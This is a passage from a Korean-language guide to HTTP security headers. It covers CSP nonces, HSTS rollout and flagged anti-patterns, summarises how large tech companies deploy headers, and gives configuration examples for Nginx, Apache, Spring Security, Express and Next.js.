│  최소 헤더 (서비스 간 통신):                                                   │
│  X-Content-Type-Options: nosniff                                             │
│  Content-Type: application/json                                              │
│  Strict-Transport-Security: max-age=31536000   (mTLS 환경이면 생략 가능)      │
│                                                                              │
│  브라우저 접근을 명시적으로 거부:                                               │
│  Content-Security-Policy: default-src 'none'                                 │
│  X-Frame-Options: DENY                                                       │
│                                                                              │
│  내부 API라도 최소 헤더를 설정하는 이유:                                       │
│  ├── 개발자가 브라우저에서 디버깅할 수 있음                                    │
│  ├── SSRF 공격으로 내부 API 응답이 브라우저에 렌더링될 수 있음                  │
│  └── Defense in Depth                                                        │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.11 CMS (WordPress 등)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              CMS 보안 헤더                                                     │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 관리자 에디터, 다양한 플러그인, 사용자 생성 콘텐츠                       │
│                                                                              │
│  Content-Security-Policy (Report-Only부터 시작):                              │
│  Content-Security-Policy-Report-Only:                                        │
│    default-src 'self';                                                       │
│    script-src 'self' 'unsafe-inline' 'unsafe-eval';  ← 초기 단계            │
│    style-src 'self' 'unsafe-inline';                                         │
│    img-src 'self' data: https:;                                              │
│    report-uri /csp-report                                                    │
│                                                                              │
│  WordPress 특수 사항:                                                         │
│  ├── 관리자 에디터(wp-admin)는 unsafe-eval 필요 (TinyMCE 등)                  │
│  ├── 프론트 페이지와 관리자 페이지에 다른 CSP 적용 고려                        │
│  ├── 플러그인이 인라인 스크립트를 대량 삽입 → nonce 적용 어려움                 │
│  └── 점진적 마이그레이션: 플러그인별 CSP 호환성 확인                            │
│                                                                              │
│  + HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy            │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 13.12 SSR (Server-Side Rendering)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              SSR 보안 헤더 (Next.js, Nuxt 등)                                  │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  특징: 서버에서 HTML 렌더링, 매 요청마다 nonce 생성 가능                       │
│                                                                              │
│  CSP nonce + strict-dynamic이 가장 적합:                                     │
│  ├── SSR 시점에 nonce 생성 가능 (정적 빌드와 달리)                             │
│  ├── HTML에 nonce 삽입 후 응답                                                │
│  └── 클라이언트 hydration 스크립트에도 nonce 적용                              │
│                                                                              │
│  Content-Security-Policy:                                                    │
│    script-src 'nonce-{PER_REQUEST_RANDOM}' 'strict-dynamic';                 │
│    style-src 'self' 'nonce-{PER_REQUEST_RANDOM}';                            │
│    ...                                                                       │
│                                                                              │
│  → SSR은 CSP nonce의 이상적인 사용 환경                                       │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 14. 베스트 프랙티스

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              보안 헤더 베스트 프랙티스                                          │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ■ 1. CSP: Report-Only → 분석 → Enforce 3단계                                │
│  ─────────────────────────────────────────────────────────────────            │
│  1단계: Report-Only로 배포하여 위반 데이터 수집 (2-4주)                        │
│  2단계: 보고서 분석, 정책 정교화 (2-4주)                                       │
│  3단계: Enforce 전환, 지속적 모니터링                                          │
│  → Dropbox가 교과서적으로 실행하여 4부작 블로그로 공유                          │
│                                                                              │
│  ■ 2. strict-dynamic + nonce 사용 (Google 권장)                               │
│  ─────────────────────────────────────────────────────────────────            │
│  CSP: script-src 'nonce-{RANDOM}' 'strict-dynamic' https: 'unsafe-inline';  │
│  → allowlist 기반 CSP의 94.68%가 무효하므로 (Google 2016 논문)                │
│  → nonce 기반이 유일하게 실효적인 XSS 방어                                    │
│                                                                              │
│  ■ 3. HSTS max-age 점진적 증가                                               │
│  ─────────────────────────────────────────────────────────────────            │
│  300 (5분) → 86400 (1일) → 604800 (1주)                                      │
│  → 2592000 (30일) → 31536000 (1년) → preload 등록                            │
│  → 실수해도 max-age 후에 정상 복구되도록 단계적 증가                           │
│                                                                              │
│  ■ 4. X-Frame-Options → frame-ancestors 병행                                  │
│  ─────────────────────────────────────────────────────────────────            │
│  X-Frame-Options: DENY                                                       │
│  Content-Security-Policy: frame-ancestors 'none'                             │
│  → 구형 브라우저(IE) + 최신 브라우저 모두 커버                                 │
│                                                                              │
│  ■ 5. 최소 권한 원칙 (Least Privilege)                                        │
│  ─────────────────────────────────────────────────────────────────            │
│  모든 헤더를 가장 제한적인 값으로 시작하고, 필요에 따라 완화                    │
│  CSP: default-src 'none' 에서 시작                                           │
│  Permissions-Policy: 사용하지 않는 기능 모두 차단                              │
│                                                                              │
│  ■ 6. 모든 응답에 보안 헤더 설정                                              │
│  ─────────────────────────────────────────────────────────────────            │
│  HTML 응답뿐 아니라 API 응답, 에러 페이지, 리다이렉트에도 적용                  │
│  → Nginx: add_header ... always; (에러 응답 포함)                            │
│                                                                              │
│  ■ 7. 환경별 다른 정책                                                        │
│  ─────────────────────────────────────────────────────────────────            │
│  개발: 느슨한 CSP (Report-Only), 디버깅 편의                                  │
│  스테이징: 프로덕션과 동일한 Enforce 정책                                      │
│  프로덕션: 가장 엄격한 정책 + 모니터링                                         │
│                                                                              │
│  ■ 8. 서드파티 정리                                                           │
│  ─────────────────────────────────────────────────────────────────            │
│  CSP 도입 전 서드파티 스크립트 인벤토리 작성                                   │
│  불필요한 서드파티 제거 → CSP 정책 단순화                                      │
│  Server-Side GTM 전환 고려                                                    │
│                                                                              │
│  ■ 9. 자동화                                                                  │
│  ─────────────────────────────────────────────────────────────────            │
│  CI/CD 파이프라인에 보안 헤더 검증 통합                                        │
│  securityheaders.com API / Mozilla Observatory 연동                          │
│  헤더 변경 시 자동 알림                                                       │
│                                                                              │
│  ■ 10. nonce 생성 보안                                                        │
│  ─────────────────────────────────────────────────────────────────            │
│  CSPRNG(Cryptographically Secure PRNG) 사용 필수                             │
│  매 요청마다 새 nonce 생성 (재사용 금지!)                                      │
│  최소 128비트 (Base64 22자 이상)                                              │
│  → Math.random() 사용 금지 (예측 가능)                                        │
│  → crypto.randomBytes(16).toString('base64') 사용                            │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 15. 안티패턴

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              보안 헤더 안티패턴 12가지                                          │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ■ 안티패턴 1: CSP unsafe-inline + unsafe-eval                               │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ script-src 'self' 'unsafe-inline' 'unsafe-eval'                          │
│  → CSP가 있으나 마나: XSS 방어 효과 0%                                       │
│  ✅ script-src 'nonce-{RANDOM}' 'strict-dynamic'                             │
│                                                                              │
│  ■ 안티패턴 2: HSTS Preload을 테스트 없이 등록                                │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ 바로 max-age=63072000; includeSubDomains; preload 설정                   │
│  → HTTP 서브도메인이 하나라도 있으면 접속 불가                                 │
│  → Preload 해제에 수개월 소요                                                 │
│  ✅ max-age=300부터 시작, 점진적 증가 후 preload 등록                          │
│                                                                              │
│  ■ 안티패턴 3: X-Frame-Options ALLOW-FROM                                    │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ X-Frame-Options: ALLOW-FROM https://partner.com                          │
│  → Chrome, Firefox에서 미지원 (무시됨 → 보호 없음!)                           │
│  ✅ Content-Security-Policy: frame-ancestors https://partner.com              │
│                                                                              │
│  ■ 안티패턴 4: CSP를 <meta> 태그로만 설정                                     │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ <meta http-equiv="Content-Security-Policy" content="...">                │
│  → frame-ancestors, report-uri, sandbox 사용 불가                            │
│  → 헤더보다 늦게 파싱되어 보호 공백 발생                                       │
│  ✅ HTTP 헤더로 설정 (meta는 보조 수단으로만)                                  │
│                                                                              │
│  ■ 안티패턴 5: CSP 와일드카드 남용                                            │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ script-src *                                                             │
│  → 모든 출처의 스크립트 허용 = CSP 없는 것과 동일                              │
│  ❌ script-src *.example.com                                                 │
│  → 서브도메인 하나라도 XSS 취약 시 전체 CSP 무효                               │
│  ✅ strict-dynamic + nonce로 출처가 아닌 신뢰 체인으로 제어                    │
│                                                                              │
│  ■ 안티패턴 6: CORS Access-Control-Allow-Origin: * + Credentials             │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ Access-Control-Allow-Origin: *                                           │
│     Access-Control-Allow-Credentials: true                                   │
│  → 브라우저가 거부 (스펙 위반)                                                │
│  ❌ Origin 헤더를 그대로 반사:                                                │
│     Access-Control-Allow-Origin: {request.origin}                            │
│  → 모든 사이트에 인증된 접근 허용 = CSRF와 동일                               │
│  ✅ 허용된 출처 화이트리스트에서만 반사                                         │
│                                                                              │
│  ■ 안티패턴 7: 정적 자산에 모든 보안 헤더 적용                                 │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ 이미지, CSS, JS 파일마다 CSP, HSTS 등 전체 적용                           │
│  → 불필요한 대역폭 낭비, CSP 오류 대량 발생                                   │
│  ✅ HTML 응답에만 CSP/X-Frame-Options 적용                                    │
│     정적 자산에는 X-Content-Type-Options, CORP, Cache-Control만 적용          │
│                                                                              │
│  ■ 안티패턴 8: X-XSS-Protection: 1 유지                                      │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ X-XSS-Protection: 1; mode=block                                         │
│  → XSS Auditor 자체가 공격 벡터 (선택적 차단, 정보 유출)                       │
│  ✅ X-XSS-Protection: 0 (명시적 비활성화)                                    │
│                                                                              │
│  ■ 안티패턴 9: Referrer-Policy: unsafe-url                                   │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ Referrer-Policy: unsafe-url                                              │
│  → 전체 URL (경로, 쿼리 포함)이 서드파티에 유출                                │
│  → 토큰, 세션 ID, 환자 번호 등 민감 정보 노출                                 │
│  ✅ strict-origin-when-cross-origin 또는 no-referrer                          │
│                                                                              │
│  ■ 안티패턴 10: 모니터링 없이 CSP Enforce 배포                                │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ Report-Only 단계 없이 바로 Enforce 적용                                   │
│  → 정상 기능이 차단되어 서비스 장애                                            │
│  ✅ Report-Only 2-4주 → 분석 → Enforce 전환                                  │
│                                                                              │
│  ■ 안티패턴 11: 도메인 allowlist만 사용하는 CSP                               │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ script-src cdn.googleapis.com cdnjs.cloudflare.com ...                   │
│  → Google 2016 논문: 94.68%가 우회 가능                                      │
│  → CDN에 JSONP, Angular 템플릿 등 악용 가능한 엔드포인트 존재                  │
│  ✅ strict-dynamic + nonce (출처가 아닌 신뢰 관계로 제어)                      │
│                                                                              │
│  ■ 안티패턴 12: 정적 nonce 재사용                                             │
│  ─────────────────────────────────────────────────────────────────            │
│  ❌ 모든 요청에 같은 nonce 값 사용 (하드코딩)                                  │
│  → 공격자가 nonce를 알아내면 CSP 무효                                         │
│  → CDN 캐시에 nonce가 포함된 HTML 저장 → 모든 사용자에게 동일 nonce            │
│  ✅ 매 요청마다 CSPRNG으로 새 nonce 생성                                      │
│  ✅ CDN Edge Worker에서 nonce 동적 주입 (Cloudflare Workers 등)               │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 16. 빅테크 실전 사례

## 16.1 Google

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Google — CSP의 개척자                                              │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ■ "CSP Is Dead, Long Live CSP!" (ACM CCS 2016)                             │
│  ─────────────────────────────────────────────────────────────────            │
│  Google 보안팀(Weichselbaum 등)의 획기적 논문:                                 │
│                                                                              │
│  연구 대상: 1,680,867개 호스트의 CSP 정책 분석                                │
│  결론: allowlist 기반 CSP의 94.68%가 우회 가능                                │
│                                                                              │
│  우회 가능 이유:                                                              │
│  ├── 허용된 도메인에 JSONP 엔드포인트 존재 (73.5%)                            │
│  ├── 허용된 도메인에 Angular/jQuery 라이브러리 호스팅 (57.2%)                  │
│  └── script-src에 unsafe-inline 포함 (87.3%)                                 │
│                                                                              │
│  제안: allowlist 대신 strict-dynamic + nonce 방식                             │
│  → 이후 업계 표준이 됨                                                        │
│                                                                              │
│  ■ Trusted Types                                                             │
│  ─────────────────────────────────────────────────────────────────            │
│  Google이 주도하여 개발한 DOM XSS 방어 메커니즘                                │
│  Gmail 2024: Trusted Types 적용 후 DOM XSS 발생 건수 0건                     │
│                                                                              │
│  적용 과정:                                                                   │
│  1. innerHTML, document.write 등 위험 Sink 사용처 파악                        │
│  2. Trusted Type 정책으로 래핑                                                │
│  3. CSP require-trusted-types-for 'script' 활성화                            │
│  4. 코드 리뷰 대상: 수천 개 Sink → 수 개 정책 정의로 축소                      │
│                                                                              │
│  ■ Google 서비스 실제 CSP                                                     │
│  ─────────────────────────────────────────────────────────────────            │
│  Google은 서비스별로 다른 CSP를 적용하지만, 공통 패턴:                          │
│  ├── strict-dynamic + nonce 기반                                             │
│  ├── object-src 'none'                                                       │
│  ├── base-uri 'self'                                                         │
│  └── report-uri로 위반 데이터 수집                                            │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 16.2 Twitter (X)

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Twitter — CSP 최적화 사례                                         │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  2013년 CSP 도입 (업계 초기 도입자)                                           │
│                                                                              │
│  CSP 헤더 크기 최적화:                                                        │
│  ├── 초기: 4.6KB의 CSP 헤더 (수백 개 도메인 allowlist)                        │
│  ├── 최적화 후: 3.4KB (26.5% 감소)                                           │
│  ├── 방법: 중복 도메인 정리, 와일드카드 활용, 미사용 출처 제거                  │
│  └── 교훈: CSP 헤더가 크면 매 요청마다 대역폭 소모                             │
│                                                                              │
│  최적화 기법:                                                                 │
│  ├── CSP 정책을 페이지 유형별로 분리 (타임라인, 프로필, 설정 등)                │
│  ├── 사용되지 않는 서드파티 도메인 주기적 감사                                  │
│  └── Report-Only로 정책 변경 사전 테스트                                      │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 16.3 GitHub

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              GitHub — 보안 헤더 모범 사례                                       │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ■ secure_headers gem 사용 (Ruby on Rails)                                   │
│  ─────────────────────────────────────────────────────────────────            │
│  GitHub이 개발/유지보수하는 보안 헤더 라이브러리                                │
│  → 모든 응답에 자동으로 보안 헤더 추가                                         │
│                                                                              │
│  ■ CSP nonce 구현                                                            │
│  ─────────────────────────────────────────────────────────────────            │
│  매 요청마다 서버에서 nonce 생성                                               │
│  모든 인라인 스크립트에 nonce 속성 삽입                                         │
│  strict-dynamic으로 동적 스크립트 관리                                         │
│                                                                              │
│  ■ SRI 적극 활용                                                             │
│  ─────────────────────────────────────────────────────────────────            │
│  모든 서드파티 리소스에 integrity 속성 적용                                    │
│  빌드 파이프라인에서 SRI 해시 자동 생성                                        │
│                                                                              │
│  ■ securityheaders.com 등급: A+                                              │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 16.4 Dropbox

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              Dropbox — CSP 도입 교과서 (4부작 블로그)                           │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Dropbox 엔지니어링 블로그 4부작:                                             │
│  "On CSP Reporting and Filtering" 시리즈                                      │
│                                                                              │
│  Part 1: Report-Only 배포와 데이터 수집                                       │
│  ├── 매일 수백만 건의 CSP 위반 보고서 수집                                    │
│  ├── 대부분 브라우저 확장 프로그램 + 광고 차단기에서 발생                       │
│  └── 실제 위협 vs 노이즈 분류 체계 구축                                       │
│                                                                              │
│  Part 2: 보고서 필터링 파이프라인                                              │
│  ├── User-Agent 기반 필터 (봇, 크롤러 제외)                                   │
│  ├── blocked-uri 패턴 매칭 (확장 프로그램 URI 제외)                            │
│  ├── source-file 기반 필터 (about:, chrome-extension: 제외)                   │
│  └── 노이즈 제거 후 실제 위반만 대시보드에 표시                                │
│                                                                              │
│  Part 3: 정책 정교화                                                         │
│  ├── 인라인 스크립트 → nonce 마이그레이션                                     │
│  ├── 서드파티 도메인 정리 및 최소화                                            │
│  └── 팀별 담당 서드파티 리뷰 프로세스                                          │
│                                                                              │
│  Part 4: Enforce 전환                                                        │
│  ├── Report-Only와 Enforce 이중 헤더 병행                                     │
│  ├── 점진적 Enforce 범위 확대                                                 │
│  └── 24/7 모니터링 + 긴급 롤백 프로세스 수립                                   │
│                                                                              │
│  교훈: CSP 도입은 마라톤, 스프린트가 아님                                      │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 16.5 Cloudflare / Mozilla / Shopify / AWS / Polyfill.io

```
┌──────────────────────────────────────────────────────────────────────────────┐
│              기타 빅테크 사례                                                   │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ■ Cloudflare                                                                │
│  ─────────────────────────────────────────────────────────────────            │
│  Managed Transforms: 원클릭 보안 헤더 추가                                    │
│  ├── HSTS, X-Content-Type-Options 등 자동 설정                                │
│  └── CSP는 사이트별 다르므로 자동화 범위 외                                    │
│  Workers: Edge에서 nonce 동적 주입                                            │
│  ├── HTMLRewriter API로 스크립트 태그에 nonce 삽입                            │
│  └── 캐시된 HTML에도 매 요청마다 새 nonce 적용 가능                            │
│                                                                              │
│  ■ Mozilla                                                                   │
│  ─────────────────────────────────────────────────────────────────            │
│  Observatory: 무료 보안 헤더 스캐너                                           │
│  ├── 6,900만+ 사이트 스캔 완료                                               │
│  ├── 135점 만점 채점 체계                                                    │
│  ├── CSP, HSTS, X-Frame-Options 등 종합 평가                                 │
│  └── API 제공으로 CI/CD 통합 가능                                             │
│                                                                              │
│  ■ Shopify                                                                   │
│  ─────────────────────────────────────────────────────────────────            │
│  PCI DSS v4 대응:                                                            │
│  ├── 결제 페이지 CSP 강화 (요구사항 6.4.3)                                    │
│  ├── iframe + WebWorker 샌드박싱으로 서드파티 격리                             │
│  └── 가맹점 서드파티 스크립트 인벤토리 자동화                                  │
│                                                                              │
│  ■ AWS CloudFront                                                            │
│  ─────────────────────────────────────────────────────────────────            │
│  SecurityHeadersPolicy (Response Headers Policy):                            │
│  ├── HSTS, X-Content-Type-Options, X-Frame-Options 등 지원                   │
│  ├── ⚠️ CSP는 미포함 — Lambda@Edge 또는 CloudFront Functions로 구현          │
│  └── 커스텀 헤더 추가 기능으로 CSP 설정 가능                                  │
│                                                                              │
│  ■ Azure Front Door: Rules Engine으로 보안 헤더 추가                          │
│  ■ GCP Cloud LB: customResponseHeaders로 보안 헤더 설정                      │
│                                                                              │
│  ■ Polyfill.io 공급망 공격 (2024)                                            │
│  ─────────────────────────────────────────────────────────────────            │
│  사건:                                                                        │
│  ├── Polyfill.io 도메인이 Funnull(중국 기업)에 매각                           │
│  ├── cdn.polyfill.io에서 악성 JavaScript 배포                                │
│  ├── 40만+ 사이트에 영향 (리다이렉트, 데이터 수집)                             │
│  ├── 모바일 디바이스만 타겟 (탐지 회피)                                       │
│  └── Cloudflare, Fastly가 안전한 미러 제공                                   │
│                                                                              │
│  SRI로 방어 가능했음:                                                         │
│  <script src="https://cdn.polyfill.io/v3/polyfill.min.js"                    │
│          integrity="sha384-KNOWN_HASH"                                       │
│          crossorigin="anonymous"></script>                                    │
│  → 악성 코드의 해시가 일치하지 않아 자동 차단되었을 것                          │
│                                                                              │
│  교훈: 서드파티 CDN을 무조건 신뢰하지 마라. SRI는 선택이 아닌 필수.            │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

# 17. 프레임워크별 구현 가이드

## 17.1 Nginx

```nginx
# /etc/nginx/conf.d/security-headers.conf
# 모든 서버 블록에서 include하여 사용

# ── XSS 방어 ──
# CSP는 애플리케이션별로 커스터마이즈 필요
add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'nonce-$request_id'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; object-src 'none'" always;

# ── deprecated XSS 필터 비활성화 ──
add_header X-XSS-Protection "0" always;

# ── 클릭재킹 방어 ──
add_header X-Frame-Options "DENY" always;

# ── 전송 보안 ──
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# ── MIME 스니핑 방지 ──
add_header X-Content-Type-Options "nosniff" always;

# ── 리퍼러 정책 ──
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# ── 권한 정책 ──
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), interest-cohort=()" always;

# ── Cross-Origin 격리 (필요 시) ──
# add_header Cross-Origin-Opener-Policy "same-origin" always;
# add_header Cross-Origin-Embedder-Policy "require-corp" always;
# add_header Cross-Origin-Resource-Policy "same-origin" always;
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  ⚠️  Nginx add_header 주의사항                                                │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  1. "always" 키워드:                                                          │
│     add_header X-Frame-Options "DENY" always;                                │
│     → 에러 응답(4xx, 5xx)에도 헤더 추가                                       │
│     → always 없으면 2xx, 3xx 응답에만 적용                                    │
│                                                                              │
│  2. 상속 규칙:                                                                │
│     server 블록에 add_header가 있으면 http 블록의 add_header 무시              │
│     location 블록에 add_header가 있으면 server 블록의 add_header 무시          │
│     → include 파일로 공통 관리 권장                                            │
│                                                                              │
│  3. nonce 동적 생성:                                                          │
│     Nginx 자체로는 nonce 생성 불가                                             │
│     → OpenResty + Lua 또는 njs (Nginx JavaScript) 사용                       │
│     → 또는 reverse proxy 뒤의 애플리케이션에서 생성                            │
│                                                                              │
│  njs 예시:                                                                    │
│  js_set $csp_nonce generate_nonce;                                           │
│  # nonce 생성 JavaScript 함수 정의 필요                                       │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 17.2 Apache

```apache
# /etc/apache2/conf-available/security-headers.conf
# a2enconf security-headers 로 활성화

# XSS 방어 — CSP
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; object-src 'none'"

# deprecated XSS 필터 비활성화
Header always set X-XSS-Protection "0"

# 클릭재킹 방어
Header always set X-Frame-Options "DENY"

# 전송 보안
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"

# MIME 스니핑 방지
Header always set X-Content-Type-Options "nosniff"

# 리퍼러 정책
Header always set Referrer-Policy "strict-origin-when-cross-origin"

# 권한 정책
Header always set Permissions-Policy "camera=(), microphone=(), geolocation=()"
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  Apache 필수 모듈: mod_headers                                                │
│  활성화: a2enmod headers && systemctl restart apache2                         │
│                                                                              │
│  "Header always set" vs "Header set":                                        │
│  ├── "always": 에러 응답에도 적용 (Nginx always와 동일)                       │
│  └── "set": 성공 응답에만 적용                                                │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 17.3 Spring Security 6.x (Java/Kotlin)

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                // CSP
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; " +
                        "script-src 'self' 'nonce-{nonce}'; " +
                        "style-src 'self' 'unsafe-inline'; " +
                        "img-src 'self' data: https:; " +
                        "font-src 'self'; " +
                        "connect-src 'self'; " +
                        "frame-ancestors 'none'; " +
                        "base-uri 'self'; " +
                        "object-src 'none'"
                    )
                )
                // HSTS
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                    .preload(true)
                )
                // X-Frame-Options
                .frameOptions(frame -> frame.deny())
                // X-Content-Type-Options (기본 활성화)
                .contentTypeOptions(Customizer.withDefaults())
                // X-XSS-Protection 비활성화
                .xssProtection(xss -> xss
                    .headerValue(XXssProtectionHeaderWriter.HeaderValue.DISABLED)
                )
                // Referrer-Policy
                .referrerPolicy(referrer -> referrer
                    .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy
                        .STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
                )
                // Permissions-Policy
                .permissionsPolicy(permissions -> permissions
                    .policy("camera=(), microphone=(), geolocation=()")
                )
            );

        return http.build();
    }
}
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  Spring Security CSP Nonce 구현                                               │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  Spring Security는 CSP nonce를 자동 생성/주입하지 않으므로                     │
│  별도 필터 구현 필요:                                                          │
│                                                                              │
│  @Component                                                                  │
│  public class CspNonceFilter extends OncePerRequestFilter {                  │
│      @Override                                                               │
│      protected void doFilterInternal(HttpServletRequest request,             │
│              HttpServletResponse response, FilterChain chain)                │
│              throws ServletException, IOException {                          │
│                                                                              │
│          byte[] nonceBytes = new byte[16];                                   │
│          SecureRandom.getInstanceStrong().nextBytes(nonceBytes);             │
│          String nonce = Base64.getEncoder()                                  │
│              .encodeToString(nonceBytes);                                    │
│                                                                              │
│          request.setAttribute("cspNonce", nonce);                            │
│                                                                              │
│          // CSP 헤더에 nonce 삽입                                             │
│          response.setHeader("Content-Security-Policy",                       │
│              "script-src 'nonce-" + nonce + "' 'strict-dynamic'; " +         │
│              "object-src 'none'; base-uri 'self'");                          │
│                                                                              │
│          chain.doFilter(request, response);                                  │
│      }                                                                       │
│  }                                                                           │
│                                                                              │
│  Thymeleaf 템플릿:                                                           │
│  <script th:attr="nonce=${cspNonce}">                                        │
│    // 인라인 스크립트                                                         │
│  </script>                                                                   │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 17.4 Express.js (Node.js)

```javascript
const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// nonce 생성 미들웨어
app.use((req, res, next) => {
    res.locals.cspNonce = crypto.randomBytes(16).toString('base64');
    next();
});

// helmet으로 보안 헤더 일괄 설정
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: [
                "'self'",
                (req, res) => `'nonce-${res.locals.cspNonce}'`,
                "'strict-dynamic'"
            ],
            styleSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            fontSrc: ["'self'"],
            connectSrc: ["'self'"],
            frameAncestors: ["'none'"],
            baseUri: ["'self'"],
            objectSrc: ["'none'"],
            formAction: ["'self'"]
        },
        reportOnly: false  // true로 변경하여 Report-Only 모드 사용
    },
    strictTransportSecurity: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    },
    frameguard: { action: 'deny' },
    xContentTypeOptions: true,           // nosniff
    referrerPolicy: {
        policy: 'strict-origin-when-cross-origin'
    },
    xXssProtection: false,               // 0 으로 설정
    permittedCrossDomainPolicies: false,
    crossOriginOpenerPolicy: { policy: 'same-origin' },
    crossOriginEmbedderPolicy: false,    // 필요 시 활성화
    crossOriginResourcePolicy: { policy: 'same-origin' }
}));

// 추가 헤더 (helmet이 미지원하는 헤더)
app.use((req, res, next) => {
    res.setHeader('Permissions-Policy',
        'camera=(), microphone=(), geolocation=(), interest-cohort=()');
    next();
});

// EJS 템플릿에서 nonce 사용
// <script nonce="<%= cspNonce %>">...</script>
```

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  helmet.js 기본값 (v7+):                                                      │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  ✅ 기본 활성화:                                                              │
│  ├── X-Content-Type-Options: nosniff                                         │
│  ├── X-DNS-Prefetch-Control: off                                             │
│  ├── X-Frame-Options: SAMEORIGIN                                             │
│  ├── Strict-Transport-Security: max-age=15552000; includeSubDomains          │
│  ├── X-Download-Options: noopen                                              │
│  ├── X-Permitted-Cross-Domain-Policies: none                                 │
│  ├── Referrer-Policy: no-referrer                                            │
│  └── Cross-Origin-Opener-Policy: same-origin                                 │
│                                                                              │
│  ❌ 기본 비활성화 (수동 설정 필요):                                             │
│  ├── Content-Security-Policy (사이트별 다름)                                   │
│  ├── Cross-Origin-Embedder-Policy                                            │
│  └── Permissions-Policy (helmet 미포함 → 수동 설정)                           │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

## 17.5 Next.js

```javascript
// next.config.js
/** @type {import('next').NextConfig} */
const nextConfig = {
    async headers() {
        return [
            {
                // 모든 경로에 적용
                source: '/:path*',
                headers: [
                    {
                        key: 'Strict-Transport-Security',
                        value: 'max-age=31536000; includeSubDomains; preload'
                    },
                    {
                        key: 'X-Content-Type-Options',
                        value: 'nosniff'
                    },
                    {
                        key: 'X-Frame-Options',
                        value: 'DENY'
                    },
                    {
                        key: 'X-XSS-Protection',
                        value: '0'
                    },
                    {
                        key: 'Referrer-Policy',
                        value: 'strict-origin-when-cross-origin'
                    },
                    {
                        key: 'Permissions-Policy',
                        value: 'camera=(), microphone=(), geolocation=()'
                    }
                ]
            }
        ];
    }
};

module.exports = nextConfig;
```

```typescript
// middleware.ts — Next.js CSP with nonce
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function middleware(request: NextRequest) {
    const nonce = Buffer.from(crypto.randomUUID()).toString('base64');

    const cspHeader = `
        default-src 'self';
        script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
        style-src 'self' 'nonce-${nonce}';
        img-src 'self' data: https:;
        font-src 'self';
        connect-src 'self';
        frame-ancestors 'none';
        base-uri 'self';
        object-src 'none';
        form-action 'self';
    `.replace(/\n/g, '').replace(/\s{2,}/g, ' ').trim();
